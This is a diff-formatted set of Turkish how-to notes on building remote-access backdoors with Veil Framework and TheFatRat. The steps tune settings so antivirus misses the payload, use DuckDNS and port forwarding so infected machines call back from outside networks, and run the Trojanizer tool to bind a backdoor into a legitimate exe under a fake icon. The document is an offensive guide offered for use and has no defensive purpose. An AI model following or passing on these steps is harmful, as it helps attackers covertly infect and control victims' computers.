@@ -1,0 +1,58 @@
+Veil Frameeework:
+    Veil Framework'ünü kuruyoruz.
+    ->use 1
+    ->list
+    ->use <payload_number>
+    ->set LHOST <kali_ip>
+    ->set LPORT <Sık kullanılmayan port seçmeye özen göster.>
+    ->set PROCESSORS ve set SLEEP fonksiyonlarını değiştirerek antivirüslere yakalanmamaya çalışıyoruz.
+    ->generate (Komutu ile tojanımızı oluşturulmaya başlıyoruz.)
+    
+TheFatrat Framework:
+    TheFatrat Framework'ünü kuruyoruz.
+    ->2(Create fud Backdoor 100%)
+    ->2(Yavaş ama güçlü mod)
+    ->Açılan panelden backdoorun bit değerini, ip adresini, prtunu ve backdoor ismini ayarlıyoruz.
+    veya:
+    ->6 (Create fud Backdoor 1000%)
+    ->İstediğiniz dil ve yöntemi seçin.
+    ->Ip ve port değerlerini belirleyin.
+    
+
+    
+Dış Ağ için Backdoor Oluşturma:
+    Öncelikle kulanacağımız portu modemden açıyoruz. 
+    İp sabitleme servisi olarak iki seçeneğimiz var.
+    1.DuckDNS:
+        www.duckdns.org adresinden siteye girelim ve oturum açalım.
+        Giriş yaptıktan sonra add domain kısmına gelip subdomain adı belirliyoruz.
+        Domainimizi oluşturduktan sonra install menüsünden işletim sistemimizi seçiyoruz.
+        Açılan sayfada oluşturduğumuz domain adresini seçiyoruz ve bize kurulum için gerekli komutları veriyor.
+        Önce linux gui version yazısına tıklayarak setup dosyasını indiriyoruz.
+        ->apt-get install zenity cron curl
+        İndirdiğimiz setup dosyasına girerek
+        ->chmod +x duck-setup-gui.sh
+        ->./duck-setup-gui.sh
+        Açılan pencerede oluşturduğumuz domain adını girioruz.
+        Token numaramızı siteden öğrendikten sonra onuda giriyoruz.
+        Ve kurulum tamamdır.
+        
+        Dış ağlar için Backdoor oluşturmanın tek farkı LHOST bölümüne kali ipmiz yerine domainimizi giriyoruz ve LPORT bölümünede modemde açtığımız portu girmemiz gerekiyor.
+        
+        
+
+        
+        
+Uygulamaların arasına backdoor gizlemek:
+    Blackdoorumuzu gerçek bir exe dosyasına fuudlamak için bir araç kurulumu yapacağız.
+    ->git clone https://github.com/r00t-3xp10it/trojanizer
+    ->cd tojanizer
+    ->ls
+    ->chmod 777 Tojanizer.sh
+    ->./Trojanizer.sh
+    Gerekli kurulumlar tamamlandıktan sonra Execute framework uyarısı veecektir burada evet diyeceğiz.
+    Bizden fuudlamak istediğimiz backdoor dosyamızı seçmemizi istiyor.
+    Backdooru seçitkten sonra LEGIT APPLICATION TO TROJANIZER ekranı gelecek, burada hangi exe dosyasına fuudlamak istiyorsak seçiyoruz.
+    Input SFX FILENAME bölümüne oluşturulan backdoorun ismini belirliyoruz.
+    ICON REPLACEMENT kısmıda bizden bir icon belirlememizi istiyor. Buradan hazır iconlardan da seçebiliriz yada input your own icon'u seçerek dosyalarımızdan kendi istediğimiz bir icon seçebiliriz.
+    
